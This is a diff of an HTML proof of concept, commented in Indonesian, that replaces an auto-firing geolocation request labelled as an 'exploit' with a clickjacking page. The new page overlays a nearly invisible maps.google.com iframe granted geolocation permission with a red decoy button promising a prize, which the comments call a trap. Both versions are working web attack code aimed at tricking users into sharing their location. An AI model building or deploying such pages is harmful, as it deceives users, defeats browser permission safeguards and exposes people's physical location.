@@ -1,42 +1,30 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Geolocation Trigger Test</title>
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+        /* Iframe yang memuat situs target */
+        #target-frame {
+            width: 100vw; height: 100vh;
+            border: none;
+            opacity: 0.1; /* Transparan agar bisa ditumpuk */
+            position: absolute;
+            z-index: 1;
+        }
+        /* Tombol jebakan */
+        #fake-button {
+            position: absolute;
+            top: 200px; left: 200px;
+            z-index: 2;
+            padding: 20px;
+            background: red;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <h1>Testing Geolocation Permission Trigger (v2)</h1>
-    <div id="status">Menginisiasi eksploitasi...</div>
-
-    <script>
-        // Mencoba memicu perilaku yang mensimulasikan interaksi pengguna
-        async function attemptExploit() {
-            const status = document.getElementById('status');
-            status.innerText = "[*] Mencoba memicu geolocation API...";
-
-            try {
-                // Mencoba memanggil geolocation
-                // Beberapa versi Chromium memerlukan 'high accuracy' atau opsi spesifik
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    });
-                });
-                status.innerText = "[+] Berhasil mendapatkan lokasi: " + position.coords.latitude;
-            } catch (err) {
-                status.innerText = "[-] Ditolak: " + err.message;
-                console.error("Error Detail:", err);
-            }
-        }
-
-        // Metode Trigger: 
-        // 1. Mencoba delay setelah load (sering dideteksi sebagai bot)
-        // 2. Mencoba memicu melalui event listener yang disimulasikan
-        window.onload = () => {
-            setTimeout(attemptExploit, 2000); 
-        };
-    </script>
+    <div id="fake-button">KLIK DISINI UNTUK HADIAH!</div>
+    <iframe id="target-frame" src="https://maps.google.com" allow="geolocation"></iframe>
 </body>
 </html>
